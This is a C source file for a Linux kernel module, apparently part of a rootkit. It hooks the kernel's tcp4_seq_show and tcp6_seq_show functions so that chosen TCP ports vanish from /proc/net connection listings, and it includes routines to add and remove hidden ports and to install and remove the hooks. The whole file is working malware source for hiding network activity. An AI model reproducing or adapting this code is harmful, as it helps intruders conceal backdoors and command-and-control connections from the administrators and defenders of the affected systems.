#include <linux/slab.h>
#include <linux/types.h>

#include <linux/tcp.h>

#include "hide_port.h"
#include "yhook.h"

DECLARE_HASHTABLE(hide_port_info_list, HIDE_PORT_HASH_TABLE_BITS);


static u32 hide_port_hash(int port) {
    /* simply return value of port as hash value */
    return port;
}

int hide_port_add(int port) {
    struct hide_port_info *cur;
    struct hide_port_info *info;
    u32 hash;

    hash = hide_port_hash(port);

    /* check if the port is already hidden */
    hash_for_each_possible(hide_port_info_list, cur, node, hash) {
        if (cur->port == port)
            return 0;
    }
    /* allocate for store hide port info */
    info = (struct hide_port_info *)kmalloc(sizeof(struct hide_port_info),
                                            GFP_KERNEL);
    if (!info)
        return -ENOMEM;
    info->port = port;
    hash_add(hide_port_info_list, &info->node, hash);
    return 0;
}

int hide_port_del(int port) {
    struct hide_port_info *cur;
    u32 hash;

    hash = hide_port_hash(port);
    hash_for_each_possible(hide_port_info_list, cur, node, hash) {
        if (cur->port == port) {
            hash_del(&cur->node);
            kfree(cur);
            break;
        }
    }
    return 0;
}

/* implement for tcp4 and tcp6 */
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    if (v != SEQ_START_TOKEN){
        struct hide_port_info *cur;
        u32 hash;
        hash = hide_port_hash(sk->sk_num);
        hash_for_each_possible(hide_port_info_list, cur, node, hash) {
            if (cur->port == sk->sk_num) {
                pr_info("hide tcp4 port:%d\n",sk->sk_num);
                return 0;
            }
        }       
    }
    return orig_tcp4_seq_show(seq, v);
}

static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hook_tcp6_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    if (v != SEQ_START_TOKEN){
        struct hide_port_info *cur;
        u32 hash;
        hash = hide_port_hash(sk->sk_num);
        hash_for_each_possible(hide_port_info_list, cur, node, hash) {
            if (cur->port == sk->sk_num) {
                pr_info("hide tcp6 port:%d\n",sk->sk_num);
                return 0;
            }
        }       
    }
    return orig_tcp6_seq_show(seq, v);
}


int hide_port_init() {
    hash_init(hide_port_info_list);
    hook_function_name_add("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show);
    hook_function_name_add("tcp6_seq_show", hook_tcp6_seq_show, &orig_tcp6_seq_show);
    return 0;
}

int hide_port_exit() {
    hook_function_del("tcp4_seq_show");
    hook_function_del("tcp6_seq_show");
    return 0;
}